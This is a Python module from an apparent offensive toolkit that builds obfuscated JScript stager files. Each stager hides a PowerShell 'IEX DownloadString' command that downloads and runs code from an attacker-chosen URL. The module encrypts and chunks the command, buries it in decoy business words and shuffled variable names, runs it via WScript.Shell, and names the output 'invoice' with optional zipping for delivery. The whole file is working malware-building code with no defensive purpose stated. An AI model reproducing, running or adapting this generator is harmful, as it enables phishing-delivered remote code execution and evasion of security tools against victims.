# bab/jscript.py — obfuscated JScript stager generation

import base64
import random
import shutil
import tempfile
import zipfile
from pathlib import Path

from .ui     import section, ok, err, info, prompt, cyan, grey, BuildAborted
from .config import HERE, save_config, validate_url, resolve_dir
from .build  import run_cmd

_B64FUNC = (
    'function unstringanator(b64){'
    'var xml=new ActiveXObject("MSXML2.DOMDocument.3.0");'
    'var node=xml.createElement("tmp");'
    'node.dataType="bin.base64";node.text=b64;'
    'var stream=new ActiveXObject("ADODB.Stream");'
    'stream.Type=1;stream.Open();stream.Write(node.nodeTypedValue);'
    'stream.Position=0;stream.Type=2;stream.Charset="utf-8";'
    'var text=stream.ReadText();stream.Close();return text;}'
)

def _load_words(filename: str) -> list:
    path = HERE / "static" / filename
    if not path.exists():
        return []
    return [w.strip() for w in path.read_text().splitlines() if w.strip()]

def _rc4_hex(key: str, data: str) -> str:
    kb = key.encode()
    S  = list(range(256))
    j  = 0
    for i in range(256):
        j = (j + S[i] + kb[i % len(kb)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    result = []
    for byte in data.encode():
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        result.append(byte ^ S[(S[i] + S[j]) % 256])
    return bytes(result).hex()

def _chunk(s: str) -> list:
    out, i = [], 0
    while i < len(s):
        size = random.randint(3, 7)
        out.append(s[i:i + size])
        i += size
    return out

def generate_jscript(url: str, key: str = "") -> str:
    biz   = _load_words("business_words.txt")
    names = _load_words("variable_names.txt")
    if len(names) < 10:
        raise ValueError("variable_names.txt needs at least 10 entries")
    random.shuffle(biz)
    random.shuffle(names)
    v = names

    ps_cmd = (f'powershell.exe -nop -exec bypass -c '
              f'"IEX (New-Object Net.WebClient).DownloadString(\'{url}\')"')
    ws_cmd = 'new ActiveXObject("WScript.Shell")'

    if key:
        enc_ps = _rc4_hex(key, ps_cmd)
        enc_ws = _rc4_hex(key, ws_cmd)
    else:
        enc_ps = base64.b64encode(ps_cmd.encode()).decode()
        enc_ws = base64.b64encode(ws_cmd.encode()).decode()

    ps_chunks = _chunk(enc_ps)
    ws_chunks = _chunk(enc_ws)
    hex_b64   = _B64FUNC.encode().hex()

    lines   = []
    biz_i   = 0
    hex_i   = 0
    eval_ch = list("eval")
    run_ch  = list("run")

    def noise(n: int):
        nonlocal biz_i
        for _ in range(n):
            if biz_i < len(biz):
                lines.append(f'  {v[0]}.push("{biz[biz_i]}");')
                biz_i += 1

    def hex_chunk():
        nonlocal hex_i
        if hex_i >= len(hex_b64):
            return
        size = random.randint(1, 10)
        lines.append(f'  {v[9]} += "{hex_b64[hex_i:hex_i + size]}"')
        hex_i += size

    for vi, init in [(0, "[]"), (1, '""'), (2, '""'), (3, '""'), (7, '""'), (8, '""'), (9, '""')]:
        lines.append(f'var {v[vi]} = {init};')
    lines += [
        'function hexToString(hex) {',
        '  var str = "";',
        '  for (var i = 0; i < hex.length; i += 2) {',
        '    str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));',
        '  }',
        '  return str;',
        '}',
    ]
    noise(random.randint(3, 9))

    for i, chunk in enumerate(ps_chunks):
        lines.append(f'  {v[1]} += "{chunk}";')
        noise(random.randint(2, 5))
        hex_chunk()
        if i < len(eval_ch):
            lines.append(f'  {v[7]} += "{eval_ch[i]}";')

    for i, chunk in enumerate(ws_chunks):
        lines.append(f'  {v[2]} += "{chunk}";')
        noise(random.randint(2, 5))
        hex_chunk()
        if i < len(run_ch):
            lines.append(f'  {v[8]} += "{run_ch[i]}";')

    while hex_i < len(hex_b64):
        hex_chunk()

    lines.append(f'var funcCode = hexToString({v[9]});')
    lines.append(f'var test = this[{v[7]}](funcCode);')
    lines.append(f'var {v[5]} = unstringanator({v[2]});')
    lines.append(f'var {v[6]} = unstringanator({v[1]});')
    noise(random.randint(3, 8))
    lines.append(f'{v[3]} = this[{v[7]}]({v[5]});')
    noise(random.randint(3, 8))
    lines.append(f'{v[4]} = {v[3]}[{v[8]}]({v[6]}, 0, true);')
    noise(random.randint(3, 8))

    return "\n".join(lines)

def do_stager(cfg: dict):
    section("Generate JScript Stager")
    print(grey("  Press Enter to keep the current value.\n"))

    url  = prompt("Download URL           ", cfg.get("stager_url",    "http://127.0.0.1/stager.exe"), validate_url)
    name = prompt("Output name (no ext)   ", cfg.get("stager_name",   "invoice"))
    outd = prompt("Output directory       ", cfg.get("stager_output", "./backdoors/stagers/"))

    try:
        key_raw = input(f"  {cyan('RC4 key (blank = Base64)')}: ").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        raise BuildAborted("Aborted.")

    try:
        mini   = input(f"  {cyan('Minify with uglifyjs? (y/N)')}: ").strip().lower() == "y"
        do_zip = input(f"  {cyan('Zip output? (y/N)')}: ").strip().lower() == "y"
    except (EOFError, KeyboardInterrupt):
        print()
        raise BuildAborted("Aborted.")

    cfg["stager_url"]    = url
    cfg["stager_name"]   = name
    cfg["stager_output"] = outd
    save_config(cfg)

    out_dir = resolve_dir(outd)
    out_dir.mkdir(parents=True, exist_ok=True)
    out_js  = out_dir / f"{name}.js"
    out_zip = out_dir / f"{name}.zip"

    print()
    try:
        src = generate_jscript(url, key_raw)
    except ValueError as e:
        err(str(e))
        return

    if mini:
        if shutil.which("uglifyjs"):
            tmp = Path(tempfile.mktemp(suffix=".js"))
            tmp.write_text(src)
            if run_cmd(["uglifyjs", str(tmp), "-c", "-m", "-o", str(out_js)]):
                tmp.unlink(missing_ok=True)
            else:
                err("uglifyjs failed — writing unminified.")
                out_js.write_text(src)
                tmp.unlink(missing_ok=True)
        else:
            info("uglifyjs not found — writing unminified.")
            out_js.write_text(src)
    else:
        out_js.write_text(src)

    if do_zip:
        with zipfile.ZipFile(out_zip, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.write(out_js, out_js.name)
        out_js.unlink()
        ok(f"Stager → {out_zip}  ({out_zip.stat().st_size} bytes)")
    else:
        ok(f"Stager → {out_js}  ({out_js.stat().st_size} bytes)")
